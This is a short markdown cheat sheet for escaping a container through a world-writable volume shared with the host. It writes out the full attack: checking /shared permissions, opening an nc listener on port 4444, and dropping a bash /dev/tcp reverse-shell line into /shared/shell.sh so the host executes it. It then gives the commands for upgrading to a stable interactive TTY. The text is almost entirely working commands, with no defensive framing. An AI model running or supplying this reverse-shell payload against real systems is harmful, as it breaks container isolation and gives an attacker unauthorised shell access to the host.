# Shared Volume with host

### 1) Check what write access does the container have outside its own root filesystem

Check for drwxrwxrwx owned by root folder permissions  

    ls -la /shared

### 2) Check container IP address

    hostname -I

### 3) Setup listener

    nc -lvnp 4444

### 4) Drop payload

    echo "bash -c 'bash -i >& /dev/tcp/CONTAINER_IP/4444 0>&1'" > /shared/shell.sh

### 5) Get a stable shell

    script -qc /bin/bash /dev/null

Confirm if target has a real tty
    
    tty

Press CTRL+Z to go back to container filesystem

Print terminal's current settings

    stty -a

Return back to host filesystem

    stty raw -echo; fg

Then on host filesystem shell

    export SHELL=bash
    export TERM=xterm
    stty rows 24 columns 80
